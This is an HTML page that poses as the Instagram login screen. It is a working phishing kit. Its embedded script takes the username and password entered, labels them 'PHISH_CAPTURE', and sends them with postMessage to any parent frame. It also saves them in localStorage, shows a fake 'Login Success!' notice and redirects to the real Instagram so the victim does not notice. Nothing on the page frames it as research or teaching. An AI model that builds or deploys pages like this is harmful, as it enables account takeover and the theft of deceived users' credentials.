<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width">
    <title>Instagram</title>
    <style>
        body{margin:0;padding:40px 20px;background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
        .container{max-width:350px;margin:0 auto;background:#fff;border:1px solid #dbdbdb;border-radius:1px;overflow:hidden;box-shadow:0 0 20px rgba(0,0,0,.05)}
        .header{padding:22px 26px;border-bottom:1px solid #efefef;text-align:center}
        .logo{width:175px;height:51px;background:#fff}
        .form{padding:10px 40px}
        input{width:100%;padding:11px 0 13px 11px;border:1px solid #efefef;border-radius:3px;background:#fafafa;font-size:14px}
        input:focus{border-color:#b2b2b2;background:#fff;outline:0}
        .login-btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:600;cursor:pointer}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo" style="background:url(https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png) no-repeat;background-size:contain;"></div>
        </div>
        <form class="form" id="loginForm">
            <input name="username" type="text" placeholder="Phone number, username, or email">
            <input name="password" type="password" placeholder="Password">
            <button type="submit" class="login-btn">Log in</button>
        </form>
    </div>

    <!-- 🔥 UNIVERSAL CONNECTION SCRIPT -->
    <script>
    document.addEventListener('DOMContentLoaded',function(){const form=document.querySelector('form');form.onsubmit=function(e){e.preventDefault();const formData=new FormData(form);const data=Object.fromEntries(formData);data.page='instagram';data.ip=location.hostname;data.url=location.href;if(window.parent!==window){window.parent.postMessage({type:'PHISH_CAPTURE',page:data.page,creds:data},'*')}localStorage.setItem('capture_'+Date.now(),JSON.stringify(data));setTimeout(()=>{window.location.href='https://www.instagram.com'},1500);document.body.innerHTML+='<div style="position:fixed;bottom:20px;right:20px;background:#4ecdc4;color:white;padding:10px;border-radius:5px">✅ Login Success!</div>';}});
    </script>
</body>
</html>
